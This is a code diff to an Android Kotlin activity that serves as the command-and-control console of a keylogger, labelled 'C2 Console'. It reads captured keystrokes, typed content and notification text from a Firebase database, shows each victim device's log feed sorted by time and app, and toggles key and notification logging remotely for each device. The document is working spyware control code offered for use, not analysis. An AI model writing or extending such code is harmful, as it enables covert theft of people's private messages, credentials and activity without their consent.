@@ -7,11 +7,9 @@ import android.view.LayoutInflater
 import android.view.View
 import android.view.ViewGroup
 import android.widget.Button
-import android.widget.LinearLayout
 import android.widget.TextView
 import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
-import androidx.appcompat.app.AppCompatDelegate
 import androidx.recyclerview.widget.LinearLayoutManager
 import androidx.recyclerview.widget.RecyclerView
 import com.google.firebase.FirebaseApp
@@ -28,25 +26,16 @@ class AdminMainActivity : AppCompatActivity() {
     private lateinit var recyclerView: RecyclerView
     private lateinit var txtTotalDevices: TextView
     private lateinit var txtTotalEvents: TextView
-    private lateinit var txtGlobalLogConsole: TextView
-    private lateinit var containerTopApps: LinearLayout
-    private lateinit var btnDarkModeToggle: Button
 
     private val deviceList = mutableListOf<DeviceModel>()
     private lateinit var adapter: DeviceAdapter
     private val DB_URL = "https://key-lo-5811c-default-rtdb.firebaseio.com"
-    private var isDarkMode = false
 
     data class DeviceModel(
         val name: String,
         var keylogging: Boolean = true,
-        var notifications: Boolean = true
-    )
-
-    data class LogEntry(
-        val timestamp: Long,
-        val appName: String,
-        val text: String
+        var notifications: Boolean = true,
+        var logFeed: String = "Waiting for telemetry..."
     )
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -60,28 +49,11 @@ class AdminMainActivity : AppCompatActivity() {
 
         txtTotalDevices = findViewById(R.id.txtTotalDevices)
         txtTotalEvents = findViewById(R.id.txtTotalEvents)
-        txtGlobalLogConsole = findViewById(R.id.txtGlobalLogConsole)
-        txtGlobalLogConsole.movementMethod = ScrollingMovementMethod()
-
-        containerTopApps = findViewById(R.id.containerTopApps)
-        btnDarkModeToggle = findViewById(R.id.btnDarkModeToggle)
-
-        btnDarkModeToggle.setOnClickListener {
-            isDarkMode = !isDarkMode
-            if (isDarkMode) {
-                AppCompatDelegate.setDefaultNightMode(AppCompatDelegate.MODE_NIGHT_YES)
-                btnDarkModeToggle.text = "☀️ Light"
-            } else {
-                AppCompatDelegate.setDefaultNightMode(AppCompatDelegate.MODE_NIGHT_NO)
-                btnDarkModeToggle.text = "🌙 Dark"
-            }
-            recreate()
-        }
 
         val btnRefresh = findViewById<Button>(R.id.btnRefreshDevices)
         btnRefresh.setOnClickListener {
             loadConnectedDevices()
-            Toast.makeText(this, "Dashboard synced successfully!", Toast.LENGTH_SHORT).show()
+            Toast.makeText(this, "C2 Console synced!", Toast.LENGTH_SHORT).show()
         }
 
         recyclerView = findViewById(R.id.recyclerViewDevices)
@@ -103,40 +75,33 @@ class AdminMainActivity : AppCompatActivity() {
         recyclerView.adapter = adapter
 
         loadConnectedDevices()
-        loadGlobalLogsAndAnalytics()
     }
 
     private fun loadConnectedDevices() {
-        val dbRef = FirebaseDatabase.getInstance(DB_URL).getReference("admin_commands")
+        val dbRef = FirebaseDatabase.getInstance(DB_URL).getReference("keystrokes_batches")
         dbRef.addValueEventListener(object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
+                var totalEventCount = 0
                 for (child in snapshot.children) {
                     val deviceName = child.key ?: continue
                     if (deviceList.none { it.name == deviceName }) {
                         val device = DeviceModel(deviceName)
                         deviceList.add(device)
                         listenToDeviceState(deviceName)
+                        listenToDeviceLogs(deviceName)
+                    }
+                    for (appChild in child.children) {
+                        for (entry in appChild.children) {
+                            val text = entry.child("text").getValue(String::class.java)
+                                ?: entry.child("title").getValue(String::class.java)
+                                ?: entry.child("typedContent").getValue(String::class.java)
+                                ?: continue
+                            if (text.isNotBlank() && text != "null") totalEventCount++
+                        }
                     }
                 }
                 txtTotalDevices.text = deviceList.size.toString()
-                adapter.notifyDataSetChanged()
-            }
-
-            override fun onCancelled(error: DatabaseError) {}
-        })
-
-        val batchRef = FirebaseDatabase.getInstance(DB_URL).getReference("keystrokes_batches")
-        batchRef.addValueEventListener(object : ValueEventListener {
-            override fun onDataChange(snapshot: DataSnapshot) {
-                for (child in snapshot.children) {
-                    val deviceName = child.key ?: continue
-                    if (deviceList.none { it.name == deviceName }) {
-                        val device = DeviceModel(deviceName)
-                        deviceList.add(device)
-                        listenToDeviceState(deviceName)
-                    }
-                }
-                txtTotalDevices.text = deviceList.size.toString()
+                txtTotalEvents.text = totalEventCount.toString()
                 adapter.notifyDataSetChanged()
             }
 
@@ -197,122 +162,48 @@ class AdminMainActivity : AppCompatActivity() {
         }
     }
 
-    private fun loadGlobalLogsAndAnalytics() {
-        val logRef = FirebaseDatabase.getInstance(DB_URL).getReference("keystrokes_batches")
+    private fun listenToDeviceLogs(deviceName: String) {
+        val logRef = FirebaseDatabase.getInstance(DB_URL).getReference("keystrokes_batches").child(deviceName)
         logRef.addValueEventListener(object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
-                val allEntries = mutableListOf<LogEntry>()
-                val appCounts = mutableMapOf<String, Int>()
+                val entries = mutableListOf<Triple<Long, String, String>>()
                 val timeFormat = SimpleDateFormat("HH:mm:ss", Locale.getDefault())
 
-                for (deviceChild in snapshot.children) {
-                    val deviceName = deviceChild.key ?: "Device"
-                    for (appChild in deviceChild.children) {
-                        val rawApp = appChild.key ?: continue
-                        val prettyApp = getPrettyAppName(rawApp)
-                        for (entry in appChild.children) {
-                            val text = entry.child("text").getValue(String::class.java)
-                                ?: entry.child("title").getValue(String::class.java)
-                                ?: entry.child("typedContent").getValue(String::class.java)
-                                ?: continue
+                for (appChild in snapshot.children) {
+                    val rawApp = appChild.key ?: continue
+                    val prettyApp = getPrettyAppName(rawApp)
+                    for (entry in appChild.children) {
+                        val text = entry.child("text").getValue(String::class.java)
+                            ?: entry.child("title").getValue(String::class.java)
+                            ?: entry.child("typedContent").getValue(String::class.java)
+                            ?: continue
 
-                            val timestampMillis = entry.child("timestamp").getValue(Long::class.java) ?: System.currentTimeMillis()
+                        val timestampMillis = entry.child("timestamp").getValue(Long::class.java) ?: System.currentTimeMillis()
 
-                            if (text.isNotBlank() && text != "null") {
-                                allEntries.add(LogEntry(timestampMillis, "$deviceName: $prettyApp", text))
-                                appCounts[prettyApp] = (appCounts[prettyApp] ?: 0) + 1
-                            }
+                        if (text.isNotBlank() && text != "null") {
+                            entries.add(Triple(timestampMillis, prettyApp, text))
                         }
                     }
                 }
 
-                // Sort latest activity on top (descending timestamp)
-                allEntries.sortByDescending { it.timestamp }
-
-                txtTotalEvents.text = allEntries.size.toString()
+                // Sort newest on top
+                entries.sortByDescending { it.first }
 
                 val sb = StringBuilder()
-                for (item in allEntries) {
-                    val timeStr = timeFormat.format(Date(item.timestamp))
-                    sb.append("$timeStr  |  ${item.appName}  |  ${item.text}\n")
+                for (item in entries) {
+                    val timeStr = timeFormat.format(Date(item.first))
+                    sb.append("[$timeStr] ${item.second}: ${item.third}\n")
                 }
-                txtGlobalLogConsole.text = if (sb.isNotEmpty()) sb.toString() else "No target logs recorded yet."
 
-                // Update Top Applications breakdown
-                updateTopAppsUI(appCounts, allEntries.size)
+                val index = deviceList.indexOfFirst { it.name == deviceName }
+                if (index != -1) {
+                    deviceList[index].logFeed = if (sb.isNotEmpty()) sb.toString() else "No telemetry recorded yet."
+                    adapter.notifyItemChanged(index)
+                }
             }
 
             override fun onCancelled(error: DatabaseError) {}
         })
-    }
-
-    private fun updateTopAppsUI(appCounts: Map<String, Int>, totalEvents: Int) {
-        containerTopApps.removeAllViews()
-        val sortedApps = appCounts.entries.sortedByDescending { it.value }.take(3)
-
-        if (sortedApps.isEmpty()) {
-            val emptyTv = TextView(this).apply {
-                text = "No application data yet."
-                setTextSize(android.util.TypedValue.COMPLEX_UNIT_SP, 12f)
-                setTextColor(Color.parseColor("#666666"))
-            }
-            containerTopApps.addView(emptyTv)
-            return
-        }
-
-        for ((appName, count) in sortedApps) {
-            val percent = if (totalEvents > 0) (count * 100) / totalEvents else 0
-
-            val itemLayout = LinearLayout(this).apply {
-                orientation = LinearLayout.VERTICAL
-                setPadding(0, 8, 0, 8)
-            }
-
-            val labelRow = LinearLayout(this).apply {
-                orientation = LinearLayout.HORIZONTAL
-            }
-
-            val nameTv = TextView(this).apply {
-                text = appName
-                setTextSize(android.util.TypedValue.COMPLEX_UNIT_SP, 13f)
-                setTypeface(null, android.graphics.Typeface.BOLD)
-                setTextColor(Color.parseColor("#1A1A1A"))
-                layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f)
-            }
-
-            val countTv = TextView(this).apply {
-                text = "$count ($percent%)"
-                setTextSize(android.util.TypedValue.COMPLEX_UNIT_SP, 12f)
-                setTextColor(Color.parseColor("#666666"))
-            }
-
-            labelRow.addView(nameTv)
-            labelRow.addView(countTv)
-            itemLayout.addView(labelRow)
-
-            val barBg = LinearLayout(this).apply {
-                orientation = LinearLayout.HORIZONTAL
-                layoutParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, 8).apply { topMargin = 4 }
-                setBackgroundColor(Color.parseColor("#E0E0E0"))
-            }
-
-            val barFill = View(this).apply {
-                val weight = if (percent > 0) percent.toFloat() / 100f else 0.01f
-                layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.MATCH_PARENT, weight)
-                setBackgroundColor(Color.parseColor("#0277BD"))
-            }
-
-            val barEmpty = View(this).apply {
-                val weight = if (percent < 100) (100 - percent).toFloat() / 100f else 0.01f
-                layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.MATCH_PARENT, weight)
-            }
-
-            barBg.addView(barFill)
-            barBg.addView(barEmpty)
-            itemLayout.addView(barBg)
-
-            containerTopApps.addView(itemLayout)
-        }
     }
 
     class DeviceAdapter(
@@ -324,6 +215,9 @@ class AdminMainActivity : AppCompatActivity() {
             val txtName: TextView = view.findViewById(R.id.txtDeviceName)
             val btnKey: Button = view.findViewById(R.id.btnToggleKeyLog)
             val btnNotif: Button = view.findViewById(R.id.btnToggleNotifLog)
+            val txtLog: TextView = view.findViewById(R.id.txtDeviceLogConsole).apply {
+                movementMethod = ScrollingMovementMethod()
+            }
         }
 
         override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): ViewHolder {
@@ -333,23 +227,25 @@ class AdminMainActivity : AppCompatActivity() {
 
         override fun onBindViewHolder(holder: ViewHolder, position: Int) {
             val device = devices[position]
-            holder.txtName.text = device.name
+            holder.txtName.text = "NODE // ${device.name}"
 
             if (device.keylogging) {
-                holder.btnKey.text = "Key Logger: ON"
-                holder.btnKey.setBackgroundColor(Color.parseColor("#388E3C"))
+                holder.btnKey.text = "KEY_LOG: ON"
+                holder.btnKey.setBackgroundColor(Color.parseColor("#238636"))
             } else {
-                holder.btnKey.text = "Key Logger: OFF"
-                holder.btnKey.setBackgroundColor(Color.parseColor("#C62828"))
+                holder.btnKey.text = "KEY_LOG: OFF"
+                holder.btnKey.setBackgroundColor(Color.parseColor("#DA3633"))
             }
 
             if (device.notifications) {
-                holder.btnNotif.text = "Notif Logger: ON"
-                holder.btnNotif.setBackgroundColor(Color.parseColor("#388E3C"))
+                holder.btnNotif.text = "NOTIF_LOG: ON"
+                holder.btnNotif.setBackgroundColor(Color.parseColor("#238636"))
             } else {
-                holder.btnNotif.text = "Notif Logger: OFF"
-                holder.btnNotif.setBackgroundColor(Color.parseColor("#C62828"))
+                holder.btnNotif.text = "NOTIF_LOG: OFF"
+                holder.btnNotif.setBackgroundColor(Color.parseColor("#DA3633"))
             }
+
+            holder.txtLog.text = device.logFeed
 
             holder.btnKey.setOnClickListener {
                 onToggle(device, "key", !device.keylogging)
